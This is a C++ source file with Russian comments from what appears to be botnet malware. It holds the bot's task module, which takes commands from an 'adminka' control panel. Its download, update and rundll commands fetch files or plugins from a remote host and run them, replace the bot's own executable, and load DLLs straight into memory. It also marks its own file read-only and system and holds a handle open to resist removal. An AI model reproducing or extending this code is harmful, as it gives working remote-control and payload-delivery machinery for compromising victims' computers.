#include "task.h"
#include "adminka.h"
#include "core\debug.h"
#include "core\file.h"
#include "main.h"
#include "core\runinmem.h"

namespace Task
{

//тип функции выполняющей команду
typedef void (*typeFuncExecCmd)( StringBuilder& cmd, StringBuilder& args );

//связка имени команды с функцией
struct CommandFunc
{
	uint nameHash;
	typeFuncExecCmd func;
};

static void ExecCmd_Download( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_Update( StringBuilder& cmd, StringBuilder& args );
static void ExecCmd_RunDll( StringBuilder& cmd, StringBuilder& args );

//таблица команд
CommandFunc commands[] = 
{
	{ 0x06e533c4 /*download*/, ExecCmd_Download },
	{ 0x07c6a8a5 /*update*/, ExecCmd_Update },
	{ 0x079c4b2c /*rundll*/, ExecCmd_RunDll },
	{ 0, 0 }
};

static HANDLE hbotExe = 0;

DWORD WINAPI ExecCmdThread( void* data );

void ProtectBot()
{
	File::SetAttributes( Config::fileNameBot, FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM );
	hbotExe = File::Open( Config::fileNameBot, GENERIC_READ, OPEN_EXISTING );
}

void UnprotectBot()
{
	File::Close(hbotExe);
	File::SetAttributes( Config::fileNameBot, FILE_ATTRIBUTE_NORMAL ); //снимаем аттрибуты защиты
}

bool Init()
{
	ProtectBot();
	return true;
}

bool ExecCmd( const char* cmd, int len )
{
	char* data = Str::Duplication( cmd, len );
	return RunThread( ExecCmdThread, data );
}

DWORD WINAPI ExecCmdThread( void* data )
{
	int len = Str::Len( (char*)data );
	StringBuilder text( 0, len + 1, (char*)data, len );
	DbgMsg( "Получена команда: '%s'", text.c_str() );

	StringArray cmds = text.Split('\n');
	for( int i = 0; i < cmds.Count(); i++ )
	{
		char* cmd = cmds[i]->c_str();
		int p = Str::IndexOf( cmd, ' ' );
		if( p < 0 ) //p будет указывать на начало аргументов
			p = cmds[i]->Len();
		else
		{
			cmd[p] = 0;
			p++;
			while( cmd[p] == ' ' ) p++; //проскакиваем пробелы
		}
		StringBuilder cmdName( 0, p + 1, cmd );
		cmdName.Lower();
		uint nameHash = cmdName.Hash();
		int j = 0;
		while( commands[j].nameHash )
		{
			if( nameHash == commands[j].nameHash )
			{
				StringBuilder args;
				args = cmd + p;
				commands[j].func( cmdName, args);
				break;
			}
			j++;
		}
	}

	Mem::Free(data);
	return 0;
}

void ExecCmd_Download( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды download[%s](%s)", cmd.c_str(), args.c_str() );
	bool loaded = false;
	Mem::Data data;
	if( args.IndexOf(':') > 0 ) //указан урл
		loaded = AdminPanel::LoadFile( args, data );
	else
		loaded = AdminPanel::LoadPlugin( args, data );
	if( loaded )
	{
		DbgMsg("Для команды download файл успешно загружен");
		char folder[MAX_PATH], fileName[MAX_PATH];
		API(KERNEL32, GetTempPathA)( sizeof(folder), folder );
		API(KERNEL32, GetTempFileNameA)( folder, 0, 0, fileName );
		File::Write( fileName, data );
		DbgMsg("Загруженный файл сохранили в '%s'", fileName );
		Process::Exec(fileName);
	}
}

void ExecCmd_Update( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды update[%s](%s)", cmd.c_str(), args.c_str() );
	Mem::Data data;
	if( AdminPanel::LoadPlugin( args, data ) )
	{
		Task::UnprotectBot();	
		if( File::WriteAll( Config::fileNameBot, data.Ptr(), data.Len() ) )
		{
			Config::ReleaseMutex();
			Process::Exec( _CS_("%s -u"), Config::fileNameBot );
			API(KERNEL32, ExitProcess)(0);
		}
		else
			Task::ProtectBot();
	}
}

DWORD WINAPI RunDllThread( void* data )
{
	Mem::Data* data2 = (Mem::Data*)data;
	RunInMem::RunDll( data2->Ptr(), data2->Len() );
	delete data2;
	return 0;
}

void ExecCmd_RunDll( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды rundll[%s](%s)", cmd.c_str(), args.c_str() );
	Mem::Data* data = new Mem::Data();
	if( AdminPanel::LoadPlugin( args, *data ) )
	{
		RunThread( RunDllThread, data );
	}
}

}
